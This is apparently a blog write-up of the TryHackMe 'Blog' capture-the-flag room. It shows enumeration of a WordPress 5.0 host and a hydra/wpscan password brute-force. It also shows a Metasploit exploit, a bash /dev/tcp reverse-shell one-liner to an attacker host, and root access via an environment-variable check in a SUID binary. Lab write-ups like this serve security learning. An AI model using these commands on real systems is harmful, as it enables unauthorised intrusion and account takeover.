---
layout: post
title: Blog writeup
subtitle: Billy Joel made a Wordpress blog!
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/blog/logo.png
share-img: /assets/img/path.jpg
tags: [ctf,tryhackme, writeup, blog, wordpress, checker]
---

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!.Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...


## Here is a machine information

| Title | Blog | 
| :------ |:--- | 
| Difficulty | Medium | 
| Point | 360 |
| Maker | Nameless0ne |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 



## RUSTSCAN, Enumeration and Gathering Information
Normally, i will use the rustscan as scan the host and gathering machine information


``` rustscan -b 500 machine-ip -- -sv -sC -A ```
<em>

-b : the batch size for port scanning, it increases or slows the speed of scanning. Depends on the open file limit of your OS.  If you do 65535 it will do every port at the same time. Although, your OS may not support this [default:4500]

-sV -sC -A: it is Nmap custom flag when rustscan run nmap.
</em>

It will take few time to scan: 

![gs1](/assets/img/blog/1.png)

After the scan is done. There expose the blog which is using Wordpress 5.0 and have smb service.
With SMB service, let's use ENUM4LINUX to check what thing is interesting.

```
enum4linux machine-ip
```

during waiting for the enumaration. Because this blog is using wordpress. Let do wpscan to check.

```
wpscan  --url machine-ip
```

![gs1](/assets/img/blog/2.png)

 There is not quite interesting thing. Let do further user enumaration.

 ```
wpscan --url machine-ip -e u
 ```

 we got 2 username: 

 ![gs1](/assets/img/blog/3.png)

 Such as longtime with Enum4linux. the scan got the same username.

 Another way to get the username. In wordpres, they have json enpoint api. 

 it is:

 ```
 http://machine-ip/wp-json/wp/v2/users
 ```

we got the same username.

![gs1](/assets/img/blog/4.png)

Trying to find credentials of 2 users. I have 2 ways to got it.

Using hydra to crack password

```
 hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V
```

and we got a lot of case. but nothing is valid. 

Let try with the wpscan 
```
wpscn --url machine-ip -U bjoel,kwheel =P rockyou-wordlist.txt
```

and we got the password.

![gs1](/assets/img/blog/5.png)

Now we got the credentials. login now. 

## Got revers shell

from the goole with wordpres 5.0, we got this. this have metaspoil module.

![gs1](/assets/img/blog/6.png)

At the metaspoil, set target, rhosts, username, password. and run exploit.
At meteprete, run cmd SHELL to get into shell.


![gs1](/assets/img/blog/7.png)

Now you are got into shell. Let do revers shell.

```
nc -lvnp 1234 #run at attack machine

/bin/bash -c "bash -i >& /dev/tcp/attacker-ip/1234 0>&1"   
```

Then you have revers shell.

## Privilege Escalation

as normally, let rung sudo -l but can not because we haven't user password.

Let enum with SUID

```
find / -perm /u=s 2>/dev/null
```

From the result, there is a checker SUID. it is a bit intersting.

![gs1](/assets/img/blog/8.png)

it looks like check the admin or not. Let try to revers and read throung the code. Download the binary and analyze it using Ghidra.

with the code 
```C

int main(void) {
  char *adminEnv = getenv("admin");

  if (adminEnv == (char *)0x0) {
    puts("Not an Admin");
  } else {
    setuid(0);
    system("/bin/bash");
  }

  return 0;
}

```

It looks like check admin envirorment. But it is just only check is null or not. we can bypass this by:

```bash
export admin=admin

/usr/sbin/hecker
```

Finally we got root user.

![gs1](/assets/img/blog/9.png)

Now we can read the root flag.

```
find / -name '*.txt' 2>/dev/null

```

you will see the hidden user flag in media.


Happy hacking!!!